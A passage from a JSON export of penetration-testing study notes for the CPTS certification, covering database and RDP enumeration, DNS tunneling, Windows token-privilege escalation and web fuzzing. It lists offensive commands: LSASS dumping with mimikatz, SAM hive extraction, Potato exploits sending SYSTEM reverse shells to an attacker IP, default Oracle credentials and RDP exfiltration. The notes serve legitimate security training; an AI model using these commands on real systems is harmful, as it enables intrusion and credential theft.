the local machine. |\n| **Note 1**: When using Rsync CLI, specify a user with the syntax: `rsync://<user>@<target>/<module>`. |  |\n| **Note 2**: To transfer files using SSH encryption, add the `-e ssh` flag. For non-standard SSH ports, use `-e ssh -p<port>`. |  |\n\n# **MSSQL (1433, 1434, 2433)**\n\n## From Linux:\n\n| **Action** | **Description** |\n| --- | --- |\n| `nxc mssql <target> -u <username> -p <password> -d >domain>` | Specifies an Active Directory account. |\n| `nxc mssql <target> -u <username> -p <password> -d .` | Specifies a local Windows account; use a dot (.) for the domain option or provide the target machine name. |\n| `nxc mssql <target> -u <username> -p <password> --local-auth` | Specifies a SQL account; use the `--local-auth` flag. |\n| `nxc mssql ... -q '<query>'` | Executes a query against the MSSQL service. |\n| `impacket-mssqlclient <username>:<password>@<target> -windows-auth` | Uses Impacket’s MSSQL client to authenticate using Windows credentials. |\n| **Note**: If [NetExec](https://github.com/Pennyw0rth/NetExec) outputs a `Pwn3d!` when authenticating, the user is a Database Administrator. |  |\n\n## From **Windows (Powershell):**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sqlcmd -S <target> -U <user> -P '<password>' -y 30 -Y 30` | Logs in to the MSSQL server with the [sqlcmd](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16), which is a built-in tool. |\n| `Import-Module .\\PowerUpSQL.ps1Get-SQLInstanceDomainGet-SQLQuery -Verbose -Instance \"<server-ip>,<server-port>\" -username \"<domain>\\<user>\" -password \"<password>\" -query 'Select @@version'` | Uses the [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) tool to query the server. |\n\n### **T-SQL Commands**\n\nTransact-SQL (T-SQL) is Microsoft’s extension of SQL used with MSSQL.\n\n| **Action** | **Description** |\n| --- | --- |\n| `SELECT name FROM sys.databases;` | Show all databases. |\n| `USE <database>;` | Select a specific database. |\n| `SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';`\n**Alternative:** `SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES` | Show all tables in the selected database. |\n| `SELECT column_name FROM information_schema.columns WHERE table_name = '<table>';` | Show all columns in the specified table. |\n| `SELECT * FROM <table>;`\n**Alternative:** `SELECT * FROM [<database>].[dbo].<table>` | Show all records from the specified table. |\n| `SELECT * FROM <table> WHERE <column> = '<string>';` | Search for a string in a specific column of the table. |\n\n# **Oracle TNS (1521)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap --script \"oracle-tns-version\" -p 1521 -sV -v <target>` | Perform a version scan using Nmap. |\n| `msfconsole -x \"use auxiliary/scanner/oracle/sid_enum; set RHOSTS <target>; run;\"` | SID enumeration via Metasploit (works on versions < 9.2.0.8). |\n| `odat sidguesser -s <target>` | Brute force SID with odat. |\n| `sudo odat passwordguesser -s <target> -d <sid>` | Credential brute force with odat. |\n| `odat all -s <target>` | Perform various scans to gather information about Oracle database services. |\n| `sqlplus <user>/<pass>@<target>/<sid>` | Log in to the Oracle database. |\n| `sqlplus <user>/<pass>@<target>/<sid> as sysdba` | Log in to the Oracle database as sysdba (admin). |\n| `SYS`:`CHANGE_ON_INSTALL\nDBSNMP`:`DBSNMP\nSCOTT`:`TIGER\nOUTLN`:`OUTLN\nWMSYS`:`WMSYS\nPCMS_SYS`:`PCMS_SYS` | Try the following default credentials. |\n\n# **MySQL (3306)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap -sV -sC -p 3306 <target>` | Nmap scan on MySQL service, will display hostname and version. |\n| `mysql -u <user> -p -h <target>` | Connects to the MySQL server. |\n\n## **SQL Commands**\n\n### Enum\n\n| **Action** | **Description** |\n| --- | --- |\n| `SHOW databases;` | Show all databases. |\n| `USE <database>;` | Select one of the existing databases. |\n| `SHOW TABLES;` | Show all available tables in the selected database. |\n| `DESCRIBE <table>;` | Show all columns and their type in the selected table. |\n| `SHOW COLUMNS FROM <table>;` | Show all columns in the selected table. |\n\n### **SELECT Statement**\n\n| **Command** | **Description** |\n| --- | --- |\n| `SELECT * FROM <table>;` | Show all columns in the desired table. |\n| `SELECT <column_X>, <column_Y> FROM <table>;` | Show some columns in the desired table. |\n| `SELECT * FROM <table> WHERE <column> = \"<string>\";` | Search for the needed string in the desired table. |\n\n### **INSERT Statement**\n\n| **Command** | **Description** |\n| --- | --- |\n| `INSERT INTO <table> VALUES (<column_value_1>, <column_value_2>);` | Insert values in a table. Columns are by order. |\n| `INSERT INTO <table>(<column_X>, <column_Y>) VALUES (<value_X>, <value_Y>);` | Insert values for certain columns in a table. The rest of the columns are empty or default. |\n\n### **UPDATE Statement**\n\n| **Command** | **Description** |\n| --- | --- |\n| `UPDATE <table> SET <column_X>=<value_X>, <column_Y>=<value_Y>, ... WHERE <condition>;` | Updates a specific record in a table according to some condition. |\n\n### **Table Manipulation**\n\n| **Command** | **Description** |\n| --- | --- |\n| `DROP <table>;` | Removes a table from the database. |\n| `ALTER TABLE <table> ADD <new-column> <data-type>;` | Adds a column to a table. |\n| `ALTER TABLE <table> RENAME <new-column> <data-type>;` | Alters the name of a table’s column. |\n\n# **RDP (3389)**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo nmap -sV -sC -p3389 --script rdp* <target>` | Footprint via Nmap scan. Reveals encryption standards, hostname, etc. Quite noisy. |\n| `rdp-sec-check.pl <target>` | Check the security settings of the RDP service. |\n| `xfreerdp /u:<user> /p:'<password>' /v:<target> /dynamic-resolution` | Log in to the RDP server from Linux with high fidelity. |\n| `xfreerdp ... /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache` | Log in to the RDP server from Linux with low fidelity. Use this if RDP is too slow. |\n| `xfreerdp ... /drive:linux,<local-directory>`\nOn the Windows host, use this command to find where the drive is:`net use` | Login to the RDP server from Linux while mounting a local directory. Excellent for exfiltration. |\n| `mstsc.exe` | Windows’ native RDP Client. |",
    "headings": [
      {
        "level": 1,
        "text": "Service Enumeration"
      },
      {
        "level": 1,
        "text": "FTP (21)"
      },
      {
        "level": 1,
        "text": "SSH (22)"
      },
      {
        "level": 1,
        "text": "SMTP (25,465,587)"
      },
      {
        "level": 2,
        "text": "Common SMTP Commands"
      },
      {
        "level": 1,
        "text": "DNS (53)"
      },
      {
        "level": 1,
        "text": "TFTP (69)"
      },
      {
        "level": 1,
        "text": "Finger (79)"
      },
      {
        "level": 1,
        "text": "Kerberos (88)"
      },
      {
        "level": 1,
        "text": "POP3 (110,995)"
      },
      {
        "level": 2,
        "text": "Common POP3 Commands"
      },
      {
        "level": 1,
        "text": "NFS (111, 2049)"
      },
      {
        "level": 1,
        "text": "SMB (139, 445)"
      },
      {
        "level": 2,
        "text": "Interacting from Windows"
      },
      {
        "level": 2,
        "text": "RPC-Client"
      },
      {
        "level": 2,
        "text": "Spidering SMB Shares"
      },
      {
        "level": 1,
        "text": "IMAP (143, 993)"
      },
      {
        "level": 2,
        "text": "Common IMAP Commands"
      },
      {
        "level": 1,
        "text": "SNMP (161,162,10161,10162)"
      },
      {
        "level": 1,
        "text": "LDAP (389, 636, 3268, 3269)"
      },
      {
        "level": 1,
        "text": "IPMI (623)"
      },
      {
        "level": 1,
        "text": "Rsync (873)"
      },
      {
        "level": 1,
        "text": "MSSQL (1433, 1434, 2433)"
      },
      {
        "level": 2,
        "text": "From Linux:"
      },
      {
        "level": 2,
        "text": "From Windows (Powershell):"
      },
      {
        "level": 3,
        "text": "T-SQL Commands"
      },
      {
        "level": 1,
        "text": "Oracle TNS (1521)"
      },
      {
        "level": 1,
        "text": "MySQL (3306)"
      },
      {
        "level": 2,
        "text": "SQL Commands"
      },
      {
        "level": 3,
        "text": "Enum"
      },
      {
        "level": 3,
        "text": "SELECT Statement"
      },
      {
        "level": 3,
        "text": "INSERT Statement"
      },
      {
        "level": 3,
        "text": "UPDATE Statement"
      },
      {
        "level": 3,
        "text": "Table Manipulation"
      },
      {
        "level": 1,
        "text": "RDP (3389)"
      }
    ],
    "commands": [],
    "tags": [
      "nmap",
      "impacket",
      "hashcat",
      "ldap",
      "smb",
      "kerberos",
      "sqli",
      "rce",
      "sudo"
    ],
    "size": 27797,
    "lineCount": 415
  },
  {
    "id": "cpts-playbook-lateral-movement-tunneling-2f0f5174ff0280a69fbafcd07564a0ae",
    "title": "Tunneling",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Lateral Movement",
    "filePath": "CPTS Playbook/Lateral Movement/Tunneling 2f0f5174ff0280a69fbafcd07564a0ae.md",
    "content": "# Tunneling\n\n## DNS Tunneling\n\n| **Command** | **Description** |\n| --- | --- |\n| `dnscat2-server <fake-domain-name>` | **Attacker**: Starts the dnscat2 server and listens for DNS connections via the fake domain.\n\nWill output a secret to stdout, prevents MITM tampering. |\n| `./dnscat2 --secret=<secret> <fake-domain-name>` | **Target**: Starts the dnscat2 client on the target, initiating a DNS tunnel to the attacker’s server.\n\nNeed to bring dnscat2 to the target. |\n| `windowswindow -i <session-id>` | Lists active `dnscat2` sessions and lets the attacker interact with a specific session. |\n| `listen <lhost>:<lport> <rhost>:<rport>` | Sets up local port forwarding through the DNS tunnel, from the attacker’s machine to the target. |\n\n## **HTTP Tunneling**\n\nHTTP tunneling is a technique used to transmit network traffic through the HTTP protocol, often to bypass network restrictions or firewalls that block non-HTTP traffic.\n\nIt works by encapsulating non-HTTP data (such as TCP or other protocol traffic) within HTTP requests and responses, allowing communication between a client and server even when direct access is restricted.\n\nThe [Chisel](https://github.com/jpillora/chisel) tool, besides being a useful pivoting tool, also encapsulates traffic in HTTP, allowing it to be used effectively for tunneling through restrictive network environments.",
    "headings": [
      {
        "level": 1,
        "text": "Tunneling"
      },
      {
        "level": 2,
        "text": "DNS Tunneling"
      },
      {
        "level": 2,
        "text": "HTTP Tunneling"
      }
    ],
    "commands": [],
    "tags": [
      "chisel"
    ],
    "size": 1365,
    "lineCount": 22
  },
  {
    "id": "cpts-playbook-post-exploitation-windows-windows-privesc-user-privileges-2eaf5174ff0280f592d0c2932323b32a",
    "title": "User Privileges",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation / Windows / Windows PrivEsc",
    "filePath": "CPTS Playbook/Post Exploitation/Windows/Windows PrivEsc/User Privileges 2eaf5174ff0280f592d0c2932323b32a.md",
    "content": "# User Privileges\n\n| **Action** | **Description** |\n| --- | --- |\n| `whoami /priv` | Checks for the privileges of the current user.\n\nIf the user is an administrator, make sure that you are own an elevated terminal (if on RDP) or that UAC is disabled or bypassed.\n\nOtherwise, there might be privileges missing. |\n| Download the [Powershell script](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1).Import and run the module:\n`Import-Module .\\EnableAllTokenPrivs.ps1\n.\\EnableAllTokenPrivs.ps1`\n\nVerify that all privileges are enabled:\n`whoami /priv` | If a privilege we need is disabled, we can enable it by running a Powershell script.\n\nAn explanation on the script can be found [here](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/). |\n\n## **SeBackupPrivilege & SeRestorePrivilege**\n\n| **Actions** | **Description** |\n| --- | --- |\n| Check if the native `robocopy` command is available:`robocopy`\n\nIf `robocopy` is unavailable, download and import [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll) and [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll):\n`Import-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll` | With `SeBackupPrivilege` or `SeRestorePrivilege`, we can copy any file regardless of standard access permissions.\n\nHowever, the standard `copy` command won’t work for this.\n\nInstead, we need to use the built-in `robocopy` utility or an external tool. |\n| Copying using native tool:`robocopy /B <source-folder> . <file-name>`\n\nCopying using external tool:`Copy-FileSeBackupPrivilege '<protected-file-path>' <output-path>` | Copies a file.`robocopy` can be a bit unintuitive at first.\n\nTo copy the file `C:\\Test\\flag.txt`, you can run:`robocopy /B C:\\Test . flag.txt` |\n| `reg save HKLM\\SYSTEM SYSTEM.save\n\nreg save HKLM\\SAM SAM.save` | `SeBackupPrivilege` and `SeRestorePrivilege` also allow us to back up sensitive registry hives like `SAM` and `SYSTEM`, which can then be used to extract local account credentials offline. |\n\n## **SeDebugPrivilege**\n\n| **Action** | **Description** |\n| --- | --- |\n| `procdump.exe -accepteula -ma lsass.exe lsass.dmp` | We can use [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) from the SysInternals suite to leverage `SeDebugPrivilege` and dump a process’s memory.\n\n`lass.exe` is a good target, as it stores user credentials after logon.\n\nAlternatives for dumping LSASS secrets are explained in [LSASS Memory Dumping](https://field-manual.brunorochamoura.com/manual/post-exploitation/windows-post-exploitation/windows-privilege-escalation/secrets-dumping/lsass-memory-dumping/). |\n| Windows:\n`.\\mimikatz.exe \"sekurlsa::minidump C:\\Tools\\lsass.dmp\" \"sekurlsa::logonpasswords\"`\n\nLinux:\n`pypykatz lsa minidump lsass.dmp` | Analyze the `lsass.dmp` file to extract credentials. |\n| Grab the [exploit executable](https://github.com/bruno-1337/SeDebugPrivilege-Exploit) from the Releases page.\n\nFind a process running as `SYSTEM` (e.g., `lsass.exe`, `winlogon.exe`) and note its PID:\n`lsass.exe`, `winlogon.exe`, etc.\n`tasklist /svc | findstr lsass`\n\nRun an arbitrary command (no output is returned):\n`SeDebugPrivesc.exe <system_pid> \"<payload>\"` | Achieve RCE by creating a new process with a spoofed `SYSTEM` parent.\n\nUsing `SeDebugPrivilege`, we obtain a handle to a privileged process.\n\nThe new process inherits `SYSTEM`-level access, allowing us to execute commands with full privileges. |\n\n## **SeImpersonate & SeAssignPrimaryToken**\n\n| **Action** | **Description** | **Latest Compatible Version** |\n| --- | --- | --- |\n| Execute command as `SYSTEM`:`.\\SigmaPotato.exe \"<payload>\"`\n\nReverse shell (unstable):`.\\SigmaPotato.exe --revshell <attacking_ip> <port>` | [**SigmaPotato**](https://github.com/tylerdotrar/SigmaPotato): New technique, works on most Windows systems. | Windows 11 & Windows Server 2022 |\n| Execute command as `SYSTEM`:`.\\PrintSpoofer.exe -c \"<payload>\"` | [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer): Despite the name, technically a potato. | Windows 10 & Server 2016/2019 |\n| **Attacking machine**: \nOpen a `socat` port forwarder:\n`socat tcp-listen:135,reuseaddr,fork tcp:<target-ip>:9999`\n\n**Attacking machine**: \nHave a listener ready to catch the shell:\n`sudo rlwrap nc -lnvp <shell-port>`\n\n**Target**: Run the exploit, which will spawn a `SYSTEM` reverse shell:\n`.\\RoguePotato.exe -r <attacker-ip> -e \"<payload>\" -l 9999` | [**RoguePotato**](https://github.com/antonioCoco/RoguePotato): Improved JuicyPotato. | Windows 10 & Server 2016/2019 |\n| Execute command as `SYSTEM`:\n\n`.\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c <payload>\" -t *` | [**JuicyPotato**](https://github.com/ohpe/juicy-potato): Oldest worthwhile potato.\n\nIf you encounter an error while running the exploit, see the troubleshooting section below. | Windows 10 build 1803 & Windows Server 2016 |\n\n## **SeLoadDriverPrivilege**\n\n> Since Windows 10 build 1803, `SeLoadDriverPrivilege` is no longer exploitable because references to registry keys under `HKEY_CURRENT_USER` are no longer permitted.\n> \n\n| **Action** | **Description** |\n| --- | --- |\n| Transfer [EnableSeLoadDriverPrivilege.cpp](https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp) to the Windows target.\n\nCompile the C++ file:\n`cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`\n\nRun the executable:\n`.\\EnableSeLoadDriverPrivilege.exe` | Check the current privileges using `whoami /priv` to verify if `SeLoadDriverPrivilege` is enabled.\n\nIn practice, `EnableAllTokenPrivs.ps1` often fails to enable this privilege correctly, despite indicating success.\n\nThis method is more reliable for enabling the privilege. |\n| [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) | Download the Capcom driver and save it on the Windows host. |\n| `reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\<capcom>.sys\"\n\nreg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1` | Add a registry reference to the Capcom driver under the `HKEY_CURRENT_USER` tree.\n\nThe Win32 API will resolve the path and use it to locate and load the driver. |\n| `DriverView.exe /stext drivers.txtcat drivers.txt | Select-String -pattern Capcom` | Use [DriverView](https://www.nirsoft.net/utils/driverview.html) to verify that the Capcom driver is loaded. |\n| Compile the [exploit](https://github.com/tandasat/ExploitCapcom) with Visual Studio.\n\nRun the exploit:\n`.\\ExploitCapcom.exe` | Finally, run the exploit.\n\nIf you’re using RDP, you can run it as-is.\n\nIf you’re using a CLI session, modify the exploit to launch a payload instead of a new terminal window.\n\nTo do this, edit line 292 of `ExploitCapcom.cpp` and replace `\"C:\\\\Windows\\\\system32\\\\cmd.exe\"` with the path to your payload. |\n\n## **SeTakeOwnershipPrivilege**\n\n| **Action** | **Description** |\n| --- | --- |\n| `takeown /f '<file-path>'icacls '<file-path>' /grant <our-user>:F` | Take ownership of a file and grant ourselves full permissions.\n\nIf we still can’t read the file after taking ownership, modify its ACL and allow access. |\n| `%WINDIR%\\repair\\sam%WINDIR%\\repair\\system%WINDIR%\\repair\\security` | If we find the `sam`, `system` and `security` registry hives saved as files, we can dump its secrets. |\n\n> Be careful when changing file ownership, as it can impact applications or users. Always get client approval before modifying ownership of critical files, like a live web.config file, and avoid making changes to files deep within subdirectories, as it can be difficult to undo.\n>",
    "headings": [
      {
        "level": 1,
        "text": "User Privileges"
      },
      {
        "level": 2,
        "text": "SeBackupPrivilege & SeRestorePrivilege"
      },
      {
        "level": 2,
        "text": "SeDebugPrivilege"
      },
      {
        "level": 2,
        "text": "SeImpersonate & SeAssignPrimaryToken"
      },
      {
        "level": 2,
        "text": "SeLoadDriverPrivilege"
      },
      {
        "level": 2,
        "text": "SeTakeOwnershipPrivilege"
      }
    ],
    "commands": [],
    "tags": [
      "mimikatz",
      "rce",
      "privesc",
      "sudo"
    ],
    "size": 7906,
    "lineCount": 138
  },
  {
    "id": "cpts-playbook-procedures-web-application-testing-2f0f5174ff02800faf68c55b0f5a7d46",
    "title": "Web Application Testing",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Procedures",
    "filePath": "CPTS Playbook/Procedures/Web Application Testing 2f0f5174ff02800faf68c55b0f5a7d46.md",
    "content": "# Web Application Testing\n\n# **Enumeration**\n\n- [ ]  `Whatweb`\n- [ ]  Subdomain enumeration\n- [ ]  Fuzz web pages (without extensions)\n    - [ ]  Fuzz common file types\n- [ ]  `robots.txt`\n- [ ]  `.git`\n- [ ]  `sitemap.xml`\n- [ ]  `exiftool` on document files found. Any interesting metadata?\n- [ ]  `nikto`",
    "headings": [
      {
        "level": 1,
        "text": "Web Application Testing"
      },
      {
        "level": 1,
        "text": "Enumeration"
      }
    ],
    "commands": [],
    "tags": [],
    "size": 308,
    "lineCount": 13
  },
  {
    "id": "cpts-playbook-information-gathering-web-enumeration-2e0f5174ff02807fa7c5f0e4145cc961",
    "title": "Web Enumeration",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Information Gathering",
    "filePath": "CPTS Playbook/Information Gathering/Web Enumeration 2e0f5174ff02807fa7c5f0e4145cc961.md",
    "content": "# Web Enumeration\n\n# **Directory & Page Fuzzing**\n\n| **Action** | **Description** |\n| --- | --- |\n| Check these pages:\n`robots.txt\nsitemap.xml\n.git` | TODO maybe this should be on another article, or just on my methodology page |\n| `ffuf -c -w <wordlist> -u http://<target-ip-or-domain>:<port>/FUZZ` | Fuzz for web directories using a single wordlist. If no iterator term is specified, `FUZZ` is assumed by default. |\n| `ffuf -c -w <ext-wordlist> -u http://<target-ip-or-domain>:<port>/indexFUZZ` | Fuzz for index files in a web directory using a file extension wordlist. The accepted extensions should be known before starting. |\n| `ffuf -c -w <filename-wordlist> -u http://<target-ip-or-domain>:<port>/FUZZ<extension>` | Once the extension is identified, fuzz for files with that specific extension. |\n| `ffuf -c -w <wordlist> -u http://<target-ip-or-domain>:<port>/FUZZ -e <dot-extension>` | TODO just extension, no recursion |\n| `ffuf -c -w <wordlist> -u http://<target-ip-or-domain>:<port>/FUZZ -recursion -recursion-depth <depth> -e <dot-extension>` | Recursively fuzz both web directories and files. If a directory is found, the search continues within that branch. This is more noisy and time-consuming but automated.TODO Let know this is a hail mary |\n\nWordlists to use:\n\n- `/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt` (for filenames)\n- `/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` (for filenames)\n- `/usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt` (for extensions)\n- `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt` (for extensions)\n\n# **Parameter & Value Fuzzing**\n\n| **Action** | **Description** |\n| --- | --- |\n| `curl -s http://<target-ip-or-domain>:<port>/admin.php | wc -c` | **(GET)** Get the baseline response to filter out bad results. Change the page URL as needed. |\n| `ffuf -c -w <parameter-wordlist> -u http://<target-ip-or-domain>:<port>/admin.php?FUZZ=<appropriate-key> -fs <char-count>` | **(GET)** Fuzz parameters using the character count from the baseline to filter out bad results. |\n| `curl -s http://<target-ip-or-domain>:<port>/admin.php -X POST -H \"Content-Type: application/x-www-form-urlencoded\" | wc -c` | **(POST)** Get the baseline response to filter out bad results. Change the page URL as needed. |\n| `ffuf -c -w <parameter-wordlist> -u http://<target-ip-or-domain>:<port>/admin.php -X POST -d 'FUZZ=<appropriate-key>' -H 'Content-Type: application/x-www-form-urlencoded' -fs <char-count>` | **(POST)** Fuzz parameters using the character count from the baseline to filter out bad results. |\n\nWordlists to use:\n\n| `/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt` (for parameters) |\n| --- |\n|  `/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` (for LFI path traversal) |\n| `/usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt` \n\n`/usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt` (for LFI web root fuzzing) |\n|  `for i in $(seq 1 1000); do echo $i >> ids.txt; done` (for value sequences) |\n\n# **Passive Subdomain Enumeration**\n\n| **Action** | **Description** |\n| --- | --- |\n| `whois <target-FQDN>`\nor\n`whois <target-ip>` | Perform a WHOIS lookup to retrieve registration and contact details of the target domain. |\n| `whois -h <whois-server> ...` | Perform a WHOIS lookup using a specified WHOIS server. |\n| `curl -s https://crt.sh/\\?q\\=<target-domain>\\&output\\=json | jq .` | Retrieve certificate transparency logs for a domain from Crt.sh. |\n| `curl -s https://crt.sh/\\?q\\=<target-domain>\\&output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u > subdomain.lst` | Extract unique subdomains from Crt.sh logs and save them to `subdomain.lst`. |\n| `for i in $(cat subdomain.lst); do host $i | grep \"has address\" | grep <target-domain> | cut -d\" \" -f4 >> ip-addresses.txt; done` | Resolve IP addresses for discovered subdomains and save to `ip-addresses.txt`. |\n| `for i in $(cat ip-addresses.txt); do shodan host $i; done` | Scan each resolved IP address using Shodan for open ports or vulnerabilities. |\n| [https://domain.glass/](https://domain.glass/) | Retrieve aggregated information about the domain. |\n| [https://buckets.grayhatwarfare.com/files](https://buckets.grayhatwarfare.com/files) | Search for public cloud storage buckets related to the target domain. |\n| [https://www.virustotal.com/gui/domain/](https://www.virustotal.com/gui/domain/) | View DNS history and related information that might reveal subdomains. |\n\n# **Subdomain & Virtual Host Fuzzing**\n\n| **Action** | **Description** |\n| --- | --- |\n| `curl -s -H \"Host: nonexistant.<target-domain>\" <target-ip>:<port> | wc -c` | Determine the character count for a “host-less” page to filter out bad results during V-Host fuzzing. |\n| `ffuf -c -w <wordlist> -u http://<target-ip-or-domain>:<port>/ -H 'Host: FUZZ.<target-domain>' -fs <char-count>` | Fuzz for virtual hosts, filtering based on the character count. After finding a valid V-Host, add it to `/etc/hosts`. |\n| `ffuf -c -w <wordlist> -u http://FUZZ.<target-domain>/` | Fuzz for DNS subdomains (works on public websites only). Avoid IP addresses, use real DNS domains. |\n\nWordlists to use:\n\n|  `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` |\n| --- |\n|  `/usr/share/seclists/Discovery/DNS/namelist.txt` |\n\n# Common Web App Enumeration",
    "headings": [
      {
        "level": 1,
        "text": "Web Enumeration"
      },
      {
        "level": 1,
        "text": "Directory & Page Fuzzing"
      },
      {
        "level": 1,
        "text": "Parameter & Value Fuzzing"
      },
      {
        "level": 1,
        "text": "Passive Subdomain Enumeration"
      },
      {
        "level": 1,
        "text": "Subdomain & Virtual Host Fuzzing"
      },
      {
        "level": 1,
        "text": "Common Web App Enumeration"
      }
    ],
    "commands": [],
    "tags": [
      "ffuf",
      "burp",
      "lfi"
    ],
    "size": 5574,
    "lineCount": 73
  },
  {
    "id": "cpts-playbook-post-exploitation-windows-2e9f5174ff02806f8264c5c47d28d3c5",
    "title": "Windows",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation",
    "filePath": "CPTS Playbook/Post Exploitation/Windows 2e9f5174ff02806f8264c5c47d28d3c5.md",
    "content": "# Windows\n\n[Windows Enumeration](Windows/Windows%20Enumeration%202e9f5174ff02804f9ddac911c93ac488.md)\n\n[Windows PrivEsc](Windows/Windows%20PrivEsc%202e9f5174ff028051b559c736a8e81bed.md)",
    "headings": [
      {
        "level": 1,
        "text": "Windows"
      }
    ],
    "commands": [],
    "tags": [
      "privesc"
    ],
    "size": 185,
    "lineCount": 5
  },
  {
    "id": "cpts-playbook-post-exploitation-windows-windows-enumeration-2e9f5174ff02804f9ddac911c93ac488",
    "title": "Windows Enumeration",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation / Windows",
    "filePath": "CPTS Playbook/Post Exploitation/Windows/Windows Enumeration 2e9f5174ff02804f9ddac911c93ac488.md",
    "content": "# Windows Enumeration\n\n> Use [WinPEAS](https://github.com/peass-ng/PEASS-ng/releases) to automate the enumeration process if in a hurry.\n> \n\n## **Users & Groups**\n\n| **Action** | **Description** |\n| --- | --- |\n| CMD:\n`net user\nnet user <user>`\n\nPowershell:\n`Get-LocalUserGet-LocalUser -Name <user>` | Lists all local user accounts.\n\nInspect properties of specific interesting users.\n\nUseful to verify if the built-in Administrator is enabled. |\n| CMD:\n`net localgroupnet localgroup \"<group-name>\"`\n\nPowershell:\n`Get-LocalGroupGet-LocalGroupMember \"<group-name>\"` | Lists all local groups and its members.\n\nInspect members of a specific interesting groups, such as:- `Adminitrators`- `Remote Desktop Users`- `Remote Management Users`etc. |\n| `whoami /priv` | Displays the privileges of the current user. |\n| `whoami /groups` | Lists the groups the current user belongs to. |\n| `net accounts` | Displays password policy. |\n| `set` | Displays all shell environment variables. |\n\n## **Operating System & Architecture**\n\n| **Action** | **Description** |\n| --- | --- |\n| `systeminfo` | Retrieves detailed system information.\n\nPay special attention to:\n- OS version\n- Build number (compare it [here](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions))\n- System architecture (see `System Type`)\n- The AD domain, if applicable\n- The Domain Controller, if applicable (`LoggonServer`) |\n| `Get-WmiObject -Class Win32_OperatingSystem | select Description` | Gets the description field of the host. |\n\n## Network\n\n| **Action** | **Description** |\n| --- | --- |\n| `ipconfig /all` | Displays all network interface configurations, including IP addresses, subnet masks, gateways, and DNS servers. |\n| `route print` | Displays the IPv4 and IPv6 routing table, showing known networks and Layer 3 routes.\nRoutes listed here may indicate reachable subnets, making them potential targets for lateral movement. |\n| `netstat -ano` | Displays active network connections and their associated PID.\n\n`ESTABLISHED`: Actively connected and exchanging data.\n`LISTENING`: Waiting for someone to connect. |\n\n## **Processes & Programs**\n\n| **Action** | **Description** |\n| --- | --- |\n| `$INSTALLED = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation\n\n$INSTALLED += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation\n\n$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize` | Queries both 32-bit and 64-bit registry keys for installed applications and their versions. \nBe sure to look for CVEs. |\n| `dir \"C:\\Program Files\"\ndir \"C:\\Program Files (x86)\"` | Lists applications in the Program Files directories.\n\nUseful for spotting tools or software not recorded in the uninstall keys. |\n| `Get-Process`\n\nOnly unique names:\n`Get-Process | Select-Object -ExpandProperty ProcessName | Sort-Object -Unique` | Enumerates running processes.\n\nFocus on interesting or uncommon names. |\n\n## **Security**\n\n| **Action** | **Description** |\n| --- | --- |\n| `Get-MpComputerStatus` | Checks Windows Defender status. |\n| `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq \"Security Update\" }` | Enumerates installed security updates. |\n| Check if UAC is enabled.\nIf it’s 0x1, it’s enabled. If it’s 0x0, it’s disabled.\n\n`REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA`\n\nCheck UAC level.\n`REG QUERY 